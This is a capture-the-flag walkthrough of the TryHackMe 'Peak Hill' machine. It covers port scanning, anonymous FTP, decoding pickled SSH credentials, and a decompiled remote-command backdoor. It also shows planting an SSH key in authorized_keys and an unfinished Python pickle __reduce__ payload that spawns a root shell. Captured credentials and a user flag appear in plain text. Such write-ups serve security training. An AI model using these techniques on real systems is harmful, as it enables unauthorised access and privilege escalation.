# Peak Hill

Exercises in Python library abuse and some exploitation techniques

[Peak Hill](https://tryhackme.com/room/peakhill)

## Topic's

- Network Enumeration
- FTP Enumeration
- Cryptography
  - Binary
- Python Scripting (Decoder)
- Reverse Enginierung
- Misconfigured Binaries

## Appendix archive

Password: `1 kn0w 1 5h0uldn'7!`

## Task 1 Peak Hill

Deploy and compromise the machine!
Make sure you're connected to TryHackMe's network.

```
kali@kali:~/CTFs/tryhackme/Peak Hill$ sudo nmap -p- -Pn -sS -sC -sV -O 10.10.13.125
[sudo] password for kali:
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-08 17:02 CEST
Nmap scan report for 10.10.13.125
Host is up (0.040s latency).
Not shown: 65531 filtered ports
PORT     STATE  SERVICE  VERSION
20/tcp   closed ftp-data
21/tcp   open   ftp      vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 ftp      ftp            17 May 15 18:37 test.txt
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.8.106.222
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open   ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 04:d5:75:9d:c1:40:51:37:73:4c:42:30:38:b8:d6:df (RSA)
|   256 7f:95:1a:d7:59:2f:19:06:ea:c1:55:ec:58:35:0c:05 (ECDSA)
|_  256 a5:15:36:92:1c:aa:59:9b:8a:d8:ea:13:c9:c0:ff:b6 (ED25519)
7321/tcp open   swx?
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns:
|     Username: Password:
|   NULL:
|_    Username:
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port7321-TCP:V=7.80%I=7%D=10/8%Time=5F7F2AE0%P=x86_64-pc-linux-gnu%r(NU
SF:LL,A,"Username:\x20")%r(GenericLines,14,"Username:\x20Password:\x20")%r
SF:(GetRequest,14,"Username:\x20Password:\x20")%r(HTTPOptions,14,"Username
SF::\x20Password:\x20")%r(RTSPRequest,14,"Username:\x20Password:\x20")%r(R
SF:PCCheck,14,"Username:\x20Password:\x20")%r(DNSVersionBindReqTCP,14,"Use
SF:rname:\x20Password:\x20")%r(DNSStatusRequestTCP,14,"Username:\x20Passwo
SF:rd:\x20")%r(Help,14,"Username:\x20Password:\x20")%r(SSLSessionReq,14,"U
SF:sername:\x20Password:\x20")%r(TerminalServerCookie,14,"Username:\x20Pas
SF:sword:\x20")%r(TLSSessionReq,14,"Username:\x20Password:\x20")%r(Kerbero
SF:s,14,"Username:\x20Password:\x20")%r(SMBProgNeg,14,"Username:\x20Passwo
SF:rd:\x20")%r(X11Probe,14,"Username:\x20Password:\x20")%r(FourOhFourReque
SF:st,14,"Username:\x20Password:\x20")%r(LPDString,14,"Username:\x20Passwo
SF:rd:\x20")%r(LDAPSearchReq,14,"Username:\x20Password:\x20")%r(LDAPBindRe
SF:q,14,"Username:\x20Password:\x20")%r(SIPOptions,14,"Username:\x20Passwo
SF:rd:\x20")%r(LANDesk-RC,14,"Username:\x20Password:\x20")%r(TerminalServe
SF:r,14,"Username:\x20Password:\x20")%r(NCP,14,"Username:\x20Password:\x20
SF:")%r(NotesRPC,14,"Username:\x20Password:\x20")%r(JavaRMI,14,"Username:\
SF:x20Password:\x20")%r(WMSRequest,14,"Username:\x20Password:\x20")%r(orac
SF:le-tns,14,"Username:\x20Password:\x20")%r(ms-sql-s,14,"Username:\x20Pas
SF:sword:\x20")%r(afp,14,"Username:\x20Password:\x20")%r(giop,14,"Username
SF::\x20Password:\x20");
Device type: general purpose|specialized|storage-misc|WAP|printer
Running (JUST GUESSING): Linux 3.X|4.X|2.6.X|2.4.X (91%), Crestron 2-Series (89%), HP embedded (89%), Asus embedded (88%)
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 cpe:/o:crestron:2_series cpe:/h:hp:p2000_g3 cpe:/o:linux:linux_kernel:2.6.22 cpe:/h:asus:rt-n56u cpe:/o:linux:linux_kernel:3.4 cpe:/o:linux:linux_kernel:2.4
Aggressive OS guesses: Linux 3.10 - 3.13 (91%), Linux 3.10 - 4.11 (90%), Linux 3.13 (90%), Linux 3.13 or 4.2 (90%), Linux 3.2 - 3.8 (90%), Linux 4.2 (90%), Linux 4.4 (90%), Crestron XPanel control system (89%), Linux 3.12 (89%), Linux 3.2 - 3.5 (89%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 353.06 seconds
```

```
kali@kali:~/CTFs/tryhackme/Peak Hill$ ftp 10.10.13.125
Connected to 10.10.13.125.
220 (vsFTPd 3.0.3)
Name (10.10.13.125:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 May 15 18:37 .
drwxr-xr-x    2 ftp      ftp          4096 May 15 18:37 ..
-rw-r--r--    1 ftp      ftp          7048 May 15 18:37 .creds
-rw-r--r--    1 ftp      ftp            17 May 15 18:37 test.txt
226 Directory send OK.
ftp>
```

- [](<https://gchq.github.io/CyberChef/#recipe=From_Binary('Space')&input=MTAwMDAwMDAwMDAwMDAxMTAxMDExMTAxMDExMTAwMDEwMDAwMDAwMDAwMTAxMDAwMDEwMTEwMDAwMDAwMTAxMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAxMTEwMDExMDExMTAwMTEwMTEwMTAwMDAxMDExMTExMDExMTAwMDAwMTEwMDAwMTAxMTEwMDExMDExMTAwMTEwMDExMDAwMTAwMTEwMTAxMDExMTAwMDEwMDAwMDAwMTAxMDExMDAwMDAwMDAwMDEwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMTExMDEwMTAxMTEwMDAxMDAwMDAwMTAxMDAwMDExMDAxMTEwMDAxMDAwMDAwMTEwMTAxMTAwMDAwMDAxMDAxMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDExMTAwMTEwMTExMDAxMTAxMTAxMDAwMDEwMTExMTEwMTExMDEwMTAxMTEwMDExMDExMDAxMDEwMTExMDAxMDAwMTEwMDAxMDExMTAwMDEwMDAwMDEwMDAxMDExMDAwMDAwMDAwMDEwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMTEwMTAwMDAxMTEwMDAxMDAwMDAxMDExMDAwMDExMDAxMTEwMDAxMDAwMDAxMTAwMTAxMTAwMDAwMDAxMDEwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDExMTAwMTEwMTExMDAxMTAxMTAxMDAwMDEwMTExMTEwMTExMDAwMDAxMTAwMDAxMDExMTAwMTEwMTExMDAxMTAwMTEwMDEwMDAxMTAxMDEwMTExMDAwMTAwMDAwMTExMDEwMTEwMDAwMDAwMDAwMTAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAxMTEwMDEwMDExMTAwMDEwMDAwMTAwMDEwMDAwMTEwMDExMTAwMDEwMDAwMTAwMTAxMDExMDAwMDAwMDEwMTAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMTExMDAxMTAxMTEwMDExMDExMDEwMDAwMTAxMTExMTAxMTEwMDAwMDExMDAwMDEwMTExMDAxMTAxMTEwMDExMDAxMTAwMTAwMDExMDAwMDAxMTEwMDAxMDAwMDEwMTAwMTEwMTAwMDAwMDAwMTAxMTAwMDAxMTAwMTExMDAwMTAwMDAxMDExMDEwMTEwMDAwMDAwMTAwMTAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAxMTEwMDExMDExMTAwMTEwMTEwMTAwMDAxMDExMTExMDExMTAwMDAwMTEwMDAwMTAxMTEwMDExMDExMTAwMTEwMDExMDExMTAxMTEwMDAxMDAwMDExMDAwMTAxMTAwMDAwMDAwMDAxMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDEwMTExMTEwMTExMDAwMTAwMDAxMTAxMTAwMDAxMTAwMTExMDAwMTAwMDAxMTEwMDEwMTEwMDAwMDAwMTAwMTAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAxMTEwMDExMDExMTAwMTEwMTEwMTAwMDAxMDExMTExMDExMTAxMDEwMTExMDAxMTAxMTAwMTAxMDExMTAwMTAwMDExMDAwMDAxMTEwMDAxMDAwMDExMTEwMTAxMTAwMDAwMDAwMDAxMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDExMDAxMTEwMTExMDAwMTAwMDEwMDAwMTAwMDAxMTAwMTExMDAwMTAwMDEwMDAxMDEwMTEwMDAwMDAwMTAxMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAxMTEwMDExMDExMTAwMTEwMTEwMTAwMDAxMDExMTExMDExMTAwMDAwMTEwMDAwMTAxMTEwMDExMDExMTAwMTEwMDExMDAxMDAwMTEwMTEwMDExMTAwMDEwMDAxMDAxMDAxMDExMDAwMDAwMDAwMDEwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMTEwMTEwMDAxMTEwMDAxMDAwMTAwMTExMDAwMDExMDAxMTEwMDAxMDAwMTAxMDAwMTAxMTAwMDAwMDAxMDAxMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDExMTAwMTEwMTExMDAxMTAxMTAxMDAwMDEwMTExMTEwMTExMDAwMDAxMTAwMDAxMDExMTAwMTEwMTExMDAxMTAwMTEwMTAxMDExMTAwMDEwMDAxMDEwMTAxMDExMDAwMDAwMDAwMDEwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDExMDAxMTAxMTEwMDAxMDAwMTAxMTAxMDAwMDExMDAxMTEwMDAxMDAwMTAxMTEwMTAxMTAwMDAwMDAxMDAxMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDExMTAwMTEwMTExMDAxMTAxMTAxMDAwMDEwMTExMTEwMTExMDAwMDAxMTAwMDAxMDExMTAwMTEwMTExMDAxMTAwMTEwMDAxMDExMTAwMDEwMDAxMTAwMDAxMDExMDAwMDAwMDAwMDEwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDExMDAwMTAxMTEwMDAxMDAwMTEwMDExMDAwMDExMDAxMTEwMDAxMDAwMTEwMTAwMTAxMTAwMDAwMDAxMDEwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDExMTAwMTEwMTExMDAxMTAxMTAxMDAwMDEwMTExMTEwMTExMDAwMDAxMTAwMDAxMDExMTAwMTEwMTExMDAxMTAwMTEwMDEwMDAxMTAwMTAwMTExMDAwMTAwMDExMDExMDExMDEwMDAwMDAwMTEwMTEwMDAwMTEwMDExMTAwMDEwMDAxMTEwMDAxMDExMDAwMDAwMDEwMTAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMTExMDAxMTAxMTEwMDExMDExMDEwMDAwMTAxMTExMTAxMTEwMDAwMDExMDAwMDEwMTExMDAxMTAxMTEwMDExMDAxMTAwMDEwMDExMDAxMDAxMTEwMDAxMDAwMTExMDEwMTAxMTAwMDAwMDAwMDAxMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDEwMDAwMDAwMTExMDAwMTAwMDExMTEwMTAwMDAxMTAwMTExMDAwMTAwMDExMTExMDEwMTEwMDAwMDAwMTAwMTAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAxMTEwMDExMDExMTAwMTEwMTEwMTAwMDAxMDExMTExMDExMTAxMDEwMTExMDAxMTAxMTAwMTAxMDExMTAwMTAwMDExMDAxMDAxMTEwMDAxMDAxMDAwMDAwMTAxMTAwMDAwMDAwMDAxMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDExMDAxMDEwMTExMDAwMTAwMTAwMDAxMTAwMDAxMTAwMTExMDAwMTAwMTAwMDEwMDEwMTEwMDAwMDAwMTAwMTAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAxMTEwMDExMDExMTAwMTEwMTEwMTAwMDAxMDExMTExMDExMTAxMDEwMTExMDAxMTAxMTAwMTAxMDExMTAwMTAwMDExMDEwMTAxMTEwMDAxMDAxMDAwMTEwMTAxMTAwMDAwMDAwMDAxMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDExMDEwMDEwMTExMDAwMTAwMTAwMTAwMTAwMDAxMTAwMTExMDAwMTAwMTAwMTAxMDEwMTEwMDAwMDAwMTAxMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAxMTEwMDExMDExMTAwMTEwMTEwMTAwMDAxMDExMTExMDExMTAwMDAwMTEwMDAwMTAxMTEwMDExMDExMTAwMTEwMDExMDAwMTAwMTExMDAwMDExMTAwMDEwMDEwMDExMDAxMTAxMDAwMDAwMDExMDExMDAwMDExMDAxMTEwMDAxMDAxMDAxMTEwMTAxMTAwMDAwMDAxMDEwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDExMTAwMTEwMTExMDAxMTAxMTAxMDAwMDEwMTExMTEwMTExMDAwMDAxMTAwMDAxMDExMTAwMTEwMTExMDAxMTAwMTEwMDEwMDAxMTAxMTEwMTExMDAwMTAwMTAxMDAwMDEwMTEwMDAwMDAwMDAwMTAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAxMTAwMTAwMDExMTAwMDEwMDEwMTAwMTEwMDAwMTEwMDExMTAwMDEwMDEwMTAxMDAxMDExMDAwMDAwMDEwMDEwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMTExMDAxMTAxMTEwMDExMDExMDEwMDAwMTAxMTExMTAxMTEwMDAwMDExMDAwMDEwMTExMDAxMTAxMTEwMDExMDAxMTAwMTEwMTExMDAwMTAwMTAxMDExMDEwMTEwMDAwMDAwMDAwMTAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAxMTAxMDExMDExMTAwMDEwMDEwMTEwMDEwMDAwMTEwMDExMTAwMDEwMDEwMTEwMTAxMDExMDAwMDAwMDEwMTAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMTExMDAxMTAxMTEwMDExMDExMDEwMDAwMTAxMTExMTAxMTEwMDAwMDExMDAwMDEwMTExMDAxMTAxMTEwMDExMDAxMTAwMDEwMDExMTAwMTAxMTEwMDAxMDAxMDExMTAwMTAxMTAwMDAwMDAwMDAxMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDExMTAxMDAwMTExMDAwMTAwMTAxMTExMTAwMDAxMTAwMTExMDAwMTAwMTEwMDAwMDEwMTEwMDAwMDAwMTAwMTAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAxMTEwMDExMDExMTAwMTEwMTEwMTAwMDAxMDExMTExMDExMTAwMDAwMTEwMDAwMTAxMTEwMDExMDExMTAwMTEwMDExMDExMDAxMTEwMDAxMDAxMTAwMDEwMTAxMTAwMDAwMDAwMDAxMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDExMTAwMTEwMTExMDAwMTAwMTEwMDEwMTAwMDAxMTAwMTExMDAwMTAwMTEwMDExMDEwMTEwMDAwMDAwMTAwMTAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAxMTEwMDExMDExMTAwMTEwMTEwMTAwMDAxMDExMTExMDExMTAwMDAwMTEwMDAwMTAxMTEwMDExMDExMTAwMTEwMDExMTAwMTAxMTEwMDAxMDAxMTAxMDAwMTEwMTAwMDAwMDExMDAxMTAwMDAxMTAwMTExMDAwMTAwMTEwMTAxMDEwMTEwMDAwMDAwMTAxMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAxMTEwMDExMDExMTAwMTEwMTEwMTAwMDAxMDExMTExMDExMTAwMDAwMTEwMDAwMTAxMTEwMDExMDExMTAwMTEwMDExMDAxMDAwMTEwMDExMDExMTAwMDEwMDExMDExMDAxMDExMDAwMDAwMDAwMDEwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMTExMDExMTAxMTEwMDAxMDAxMTAxMTExMDAwMDExMDAxMTEwMDAxMDAxMTEwMDAwMTAxMTAwMDAwMDAxMDEwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDExMTAwMTEwMTExMDAxMTAxMTAxMDAwMDEwMTExMTEwMTExMDAwMDAxMTAwMDAxMDExMTAwMTEwMTExMDAxMTAwMTEwMDEwMDAxMTAwMDEwMTExMDAwMTAwMTExMDAxMDExMDEwMDAwMDAxMDExMDEwMDAwMTEwMDExMTAwMDEwMDExMTAxMDAxMDExMDAwMDAwMDEwMDEwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMTExMDAxMTAxMTEwMDExMDExMDEwMDAwMTAxMTExMTAxMTEwMDAwMDExMDAwMDEwMTExMDAxMTAxMTEwMDExMDAxMTAxMDAwMTExMDAwMTAwMTExMDExMDExMDEwMDAwMDAxMDAxMTEwMDAwMTEwMDExMTAwMDEwMDExMTEwMDAxMDExMDAwMDAwMDEwMTAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMTExMDAxMTAxMTEwMDExMDExMDEwMDAwMTAxMTExMTAxMTEwMDAwMDExMDAwMDEwMTExMDAxMTAxMTEwMDExMDAxMTAwMDEwMDExMDEwMDAxMTEwMDAxMDAxMTExMDEwMTAxMTAwMDAwMDAwMDAxMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAxMTAwMDAwMTExMDAwMTAwMTExMTEwMTAwMDAxMTAwMTExMDAwMTAwMTExMTExMDEwMTEwMDAwMDAwMTAwMTAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAxMTEwMDExMDExMTAwMTEwMTEwMTAwMDAxMDExMTExMDExMTAxMDEwMTExMDAxMTAxMTAwMTAxMDExMTAwMTAwMDExMDExMDAxMTEwMDAxMDEwMDAwMDAwMTAxMTAwMDAwMDAwMDAxMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDExMDExMTAwMTExMDAwMTAxMDAwMDAxMTAwMDAxMTAwMTExMDAwMTAxMDAwMDEwMDEwMTEwMDAwMDAwMTAwMTAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAxMTEwMDExMDExMTAwMTEwMTEwMTAwMDAxMDExMTExMDExMTAwMDAwMTEwMDAwMTAxMTEwMDExMDExMTAwMTEwMDExMDAxMDAxMTEwMDAxMDEwMDAwMTEwMTAxMTAwMDAwMDAwMDAxMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDExMDAwMTEwMTExMDAwMTAxMDAwMTAwMTAwMDAxMTAwMTExMDAwMTAxMDAwMTAxMDEwMTEwMDAwMDAwMTAxMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAxMTEwMDExMDExMTAwMTEwMTEwMTAwMDAxMDExMTExMDExMTAwMDAwMTEwMDAwMTAxMTEwMDExMDExMTAwMTEwMDExMDAwMTAwMTEwMDExMDExMTAwMDEwMTAwMDExMDAxMTAxMDAwMDAwMDEwMDAxMDAwMDExMDAxMTEwMDAxMDEwMDAxMTEwMTAxMTAwMDAwMDAxMDEwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDExMTAwMTEwMTExMDAxMTAxMTAxMDAwMDEwMTExMTEwMTExMDAwMDAxMTAwMDAxMDExMTAwMTEwMTExMDAxMTAwMTEwMDAxMDAxMTAxMTAwMTExMDAwMTAxMDAxMDAwMDExMDEwMDAwMTAwMDAwMTEwMDAwMTEwMDExMTAwMDEwMTAwMTAwMTAxMDExMDAwMDAwMDEwMDEwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMTExMDAxMTAxMTEwMDExMDExMDEwMDAwMTAxMTExMTAxMTEwMDAwMDExMDAwMDEwMTExMDAxMTAxMTEwMDExMDAxMTEwMDAwMTExMDAwMTAxMDAxMDEwMDExMDEwMDAwMDAxMTExMDEwMDAwMTEwMDExMTAwMDEwMTAwMTAxMTAxMDExMDAwMDAwMDEwMTAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMTExMDAxMTAxMTEwMDExMDExMDEwMDAwMTAxMTExMTAxMTEwMDAwMDExMDAwMDEwMTExMDAxMTAxMTEwMDExMDAxMTAwMDEwMDExMDExMTAxMTEwMDAxMDEwMDExMDAwMTEwMTAwMDAwMTAxMDAxMTAwMDAxMTAwMTExMDAwMTAxMDAxMTAxMDEwMTEwMDAwMDAwMTAxMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAxMTEwMDExMDExMTAwMTEwMTEwMTAwMDAxMDExMTExMDExMTAwMDAwMTEwMDAwMTAxMTEwMDExMDExMTAwMTEwMDExMDAxMDAwMTEwMTAwMDExMTAwMDEwMTAwMTExMDAxMTAxMDAwMDAxMTExMTAxMDAwMDExMDAxMTEwMDAxMDEwMDExMTEwMTAxMTAwMDAwMDAxMDAxMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDExMTAwMTEwMTExMDAxMTAxMTAxMDAwMDEwMTExMTEwMTExMDEwMTAxMTEwMDExMDExMDAxMDEwMTExMDAxMDAwMTEwMDExMDExMTAwMDEwMTAxMDAwMDAxMTAxMDAwMDAwMDEwMDAxMDAwMDExMDAxMTEwMDAxMDEwMTAwMDEwMTAxMTAwMDAwMDAxMDAxMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDExMTAwMTEwMTExMDAxMTAxMTAxMDAwMDEwMTExMTEwMTExMDEwMTAxMTEwMDExMDExMDAxMDEwMTExMDAxMDAwMTEwMTAwMDExMTAwMDEwMTAxMDAxMDAxMTAxMDAwMDAxMDExMDAxMDAwMDExMDAxMTEwMDAxMDEwMTAwMTEwMTAxMTAwMDAwMDAxMDEwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDExMTAwMTEwMTExMDAxMTAxMTAxMDAwMDEwMTExMTEwMTExMDAwMDAxMTAwMDAxMDExMTAwMTEwMTExMDAxMTAwMTEwMDAxMDAxMTAwMDEwMTExMDAwMTAxMDEwMTAwMDExMDEwMDAwMDAwMTEwMTEwMDAwMTEwMDExMTAwMDEwMTAxMDEwMTAxMDExMDAwMDAwMDEwMDEwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMTExMDAxMTAxMTEwMDExMDExMDEwMDAwMTAxMTExMTAxMTEwMDAwMDExMDAwMDEwMTExMDAxMTAxMTEwMDExMDAxMTAwMDAwMTExMDAwMTAxMDEwMTEwMDEwMTEwMDAwMDAwMDAwMTAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAxMTEwMDAwMDExMTAwMDEwMTAxMDExMTEwMDAwMTEwMDExMTAwMDEwMTAxMTAwMDAxMDExMDAwMDAwMDEwMTAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMTExMDAxMTAxMTEwMDExMDExMDEwMDAwMTAxMTExMTAxMTEwMDAwMDExMDAwMDEwMTExMDAxMTAxMTEwMDExMDAxMTAwMDEwMDExMDAwMDAxMTEwMDAxMDEwMTEwMDEwMTEwMTAwMDAwMDExMDAxMTAwMDAxMTAwMTExMDAwMTAxMDExMDEwMDExMDAxMDEwMDEwMTExMA>)

```
..]q.(X
...ssh_pass15q.X....uq..q.X	...ssh_user1q.X....hq..q.X
...ssh_pass25q.X....rq..q	X
...ssh_pass20q
h..q.X	...ssh_pass7q.X...._q
.q.X	...ssh_user0q.X....gq..q.X
...ssh_pass26q.X....lq..q.X	...ssh_pass5q.X....3q..q.X	...ssh_pass1q.X....1q..q.X
...ssh_pass22q.h
.q.X
...ssh_pass12q.X....@q..q.X	...ssh_user2q X....eq!.q"X	...ssh_user5q#X....iq$.q%X
...ssh_pass18q&h
.q'X
...ssh_pass27q(X....dq).q*X	...ssh_pass3q+X....kq,.q-X
...ssh_pass19q.X....tq/.q0X	...ssh_pass6q1X....sq2.q3X	...ssh_pass9q4h..q5X
...ssh_pass23q6X....wq7.q8X
...ssh_pass21q9h..q:X	...ssh_pass4q;h..q<X
...ssh_pass14q=X....0q>.q?X	...ssh_user6q@X....nqA.qBX	...ssh_pass2qCX....cqD.qEX
...ssh_pass13qFh..qGX
...ssh_pass16qHhA.qIX	...ssh_pass8qJh..qKX
...ssh_pass17qLh).qMX
...ssh_pass24qNh>.qOX	...ssh_user3qPh..qQX	...ssh_user4qRh,.qSX
...ssh_pass11qTh
.qUX	...ssh_pass0qVX....pqW.qXX
...ssh_pass10qYh..qZe.
```

```
kali@kali:~/CTFs/tryhackme/Peak Hill$ python3 decode_pickel.py
SSH user: gherkin
SSH pass: p1ckl3s_@11_@r0und_th3_w0rld
```

```
gherkin@ubuntu-xenial:~$ ls -la
total 16
drwxr-xr-x 3 gherkin gherkin 4096 Oct  8 15:24 .
drwxr-xr-x 4 root    root    4096 May 15 18:38 ..
drwx------ 2 gherkin gherkin 4096 Oct  8 15:24 .cache
-rw-r--r-- 1 root    root    2350 May 15 18:37 cmd_service.pyc
gherkin@ubuntu-xenial:~$
```

```py
kali@kali:~/CTFs/tryhackme/Peak Hill$ uncompyle6 cmd_service.pyc
# uncompyle6 version 3.7.4
# Python bytecode 3.8 (3413)
# Decompiled from: Python 3.8.2 (default, Apr  1 2020, 15:52:55)
# [GCC 9.3.0]
# Embedded file name: ./cmd_service.py
# Compiled at: 2020-05-14 19:55:16
# Size of source mod 2**32: 2140 bytes
from Crypto.Util.number import bytes_to_long, long_to_bytes
import sys, textwrap, socketserver, string, readline, threading
from time import *
import getpass, os, subprocess
username = long_to_bytes(1684630636)
password = long_to_bytes(2457564920124666544827225107428488864802762356)

class Service(socketserver.BaseRequestHandler):

    def ask_creds(self):
        username_input = self.receive(b'Username: ').strip()
        password_input = self.receive(b'Password: ').strip()
        print(username_input, password_input)
        if username_input == username:
            if password_input == password:
                return True
        return False

    def handle(self):
        loggedin = self.ask_creds()
        if not loggedin:
            self.send(b'Wrong credentials!')
            return None
        self.send(b'Successfully logged in!')
        while True:
            command = self.receive(b'Cmd: ')
            p = subprocess.Popen(command,
              shell=True, stdout=(subprocess.PIPE), stderr=(subprocess.PIPE))
            self.send(p.stdout.read())

    def send(self, string, newline=True):
        if newline:
            string = string + b'\n'
        self.request.sendall(string)

    def receive(self, prompt=b'> '):
        self.send(prompt, newline=False)
        return self.request.recv(4096).strip()


class ThreadedService(socketserver.ThreadingMixIn, socketserver.TCPServer, socketserver.DatagramRequestHandler):
    pass


def main():
    print('Starting server...')
    port = 7321
    host = '0.0.0.0'
    service = Service
    server = ThreadedService((host, port), service)
    server.allow_reuse_address = True
    server_thread = threading.Thread(target=(server.serve_forever))
    server_thread.daemon = True
    server_thread.start()
    print('Server started on ' + str(server.server_address) + '!')
    while True:
        sleep(10)


if __name__ == '__main__':
    main()
# okay decompiling cmd_service.pyc
```

```
kali@kali:~/CTFs/tryhackme/Peak Hill$ python3
Python 3.8.2 (default, Apr  1 2020, 15:52:55)
[GCC 9.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from Crypto.Util.number import long_to_bytes
>>> print(long_to_bytes(1684630636))
b'dill'
>>> print(long_to_bytes(2457564920124666544827225107428488864802762356))
b'n3v3r_@_d1ll_m0m3nt'
>>>
```

```
kali@kali:~/CTFs/tryhackme/Peak Hill$ nc 10.10.13.125 7321
Username: dill
Password: n3v3r_@_d1ll_m0m3nt
Successfully logged in!
Cmd: ls -la
total 12
drwxr-xr-x  2 root root 4096 May 15 18:38 .
drwxr-xr-x 15 root root 4096 May 15 18:38 ..
-r-xr-x---  1 dill dill 2141 May 15 18:38 .cmd_service.py

Cmd: pwd
/var/cmd

Cmd: whoami
dill

Cmd: cd

Cmd: pwd
/var/cmd

Cmd: cat /home/dill/user.txt
f1e13335c47306e193212c98fc07b6a0

Cmd: echo "ssh-rsa XYZ= kali@kali" >> /home/dill/.ssh/authorized_keys
```

```
kali@kali:~/CTFs/tryhackme/Peak Hill$ ssh dill@10.10.13.125
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-177-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


28 packages can be updated.
19 updates are security updates.


Last login: Wed May 20 21:56:05 2020 from 10.1.122.133
dill@ubuntu-xenial:~$ pwd
/home/dill
dill@ubuntu-xenial:~$ sudo -l
Matching Defaults entries for dill on ubuntu-xenial:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dill may run the following commands on ubuntu-xenial:
    (ALL : ALL) NOPASSWD: /opt/peak_hill_farm/peak_hill_farm
dill@ubuntu-xenial:~$
```

```
dill@ubuntu-xenial:/opt/peak_hill_farm$ python3
Python 3.5.2 (default, Apr 16 2020, 17:47:17)
[GCC 5.4.0 20160609] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import os
>>> import pickle
>>> import base64
>>> class evil_object(object):
    def __reduce__(self... ):
        return (os.system, ('/bin/bash',))...
...
>>> x = evil_object()
